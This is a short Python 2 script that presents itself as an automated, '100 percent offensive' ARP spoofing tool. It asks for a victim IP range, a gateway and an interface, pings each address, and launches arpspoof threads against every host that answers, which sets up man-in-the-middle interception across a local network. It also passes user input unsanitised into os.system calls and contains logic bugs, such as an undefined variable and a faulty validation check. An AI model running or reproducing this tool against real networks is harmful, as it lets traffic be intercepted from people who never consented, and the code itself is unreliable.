import sys,os,netaddr,pprint,subprocess,thread,time
def threadactivity(iptospoof,inter,gate):
	try:
		result=os.system("arpspoof -i "+inter +" -t "+iptospoof+" "+gate+"")
		#print result
	except:
		return error
alivehostcont=0	
print("Here Starts the Ultimately Automated ARP SPOOFING 100 percent offensive tool")
fromipuser=raw_input("Enter Victim's Starting IP address	: ")
toipuser=raw_input("Enter the Victim's Ending IP address	: ")
gateway=raw_input("Enter the Gateway or server Address : ")
interface=raw_input("Enter the Interface for Operating : ")
splitfromip=fromipuser.split('.')
splittoip=toipuser.split('.')
fromip1=int(splitfromip[0])
fromip2=int(splitfromip[1])
fromip3=int(splitfromip[2])
fromip4=int(splitfromip[3])
toip1=int(splittoip[0])
toip2=int(splittoip[1])
toip3=int(splittoip[2])
toip4=int(splittoip[3])
if((fromip1 >255 or fromip2 > 255 or fromip3 >255 or fromip4 > 255) and (toip1 > 255 or toip2 > 255 or toip3 >255 or toip4 > 255)):
	print("                 Enter Valid IP Address")
else:
	ipcal1=toip1-fromip1
	ipcal2=toip2-fromip2
	ipcal3=toip3-fromip3
	ipcal4=toip4-fromip4
	
	hostcount=ipcal4+(ipcal3*255)+(ipcal2*65025)
	
	if(ipcal4 < 0):
		ipcal3=ipcal3-1
		ipcal4=ipcal4+255
	if(ipcal3 < 0):
		ipcal2=ipcal2-1
		ipcal3=ipcal3+255
	if(ipcal2 < 0):
		ipcal1=ipcal1-1
		ipcal2=ipcal2+255
	for count in range(0,hostcount):
		
		if(fromip4 > 255):
			fromip4=0
			fromip3=fromip3+1
		if(fromip3 > 255):
			fromip3=0
			fromip2=fromip2+1
		if(fromip2 > 255):
			fromip2=0
			fromip1=fromip+1
		currentip=str(fromip1)+"."+str(fromip2)+"."+str(fromip3)+"."+str(fromip4)
		print("IP   :   "+currentip)
		res=os.system("ping -c 2 "+currentip+"")
		print(res)
		if(res==0):
			alivehostcont=alivehostcont+1
			thread.start_new_thread(threadactivity,(currentip,interface,gateway))
			fromip4=fromip4+1
		else:
			fromip4=fromip4+1
		
	print("")
	print("Alive Host Count  :  "+str(alivehostcont))
	while(1):
		pass

	"""print("Starting IP Address is	: 	"+str(fromip1)+"."+str(fromip2)+"."+str(fromip3)+"."+str(fromip4))
	print("Ending IP Address is 	:	"+str(toip1)+"."+str(toip2)+"."+str(toip3)+"."+str(toip4)) 	
	if(fromip1 == toip1 and fromip2 == toip2 and fromip3 == toip3 ):
		for i4 in range(fromip4,toip4):
			print(str(fromip1)+"."+str(fromip2)+"."+str(fromip3)+"."+str(i4))
	elif(fromip1 == toip1 and fromip2 == toip2):
		for j3 in range(fromip3,toip3):
			for j4 in range(fromip4,toip4):
				print(str(fromip1)+"."+str(fromip2)+"."+str(j3)+"."+str(j4))
	else:
		for k2 in range(fromip2,toip2):
			for k3 in range(fromip3,toip3):
				for k4 in range(fromip4,toip4):
					print(str(fromip1)+"."+str(k2)+"."+str(k3)+"."+str(k4))"""	

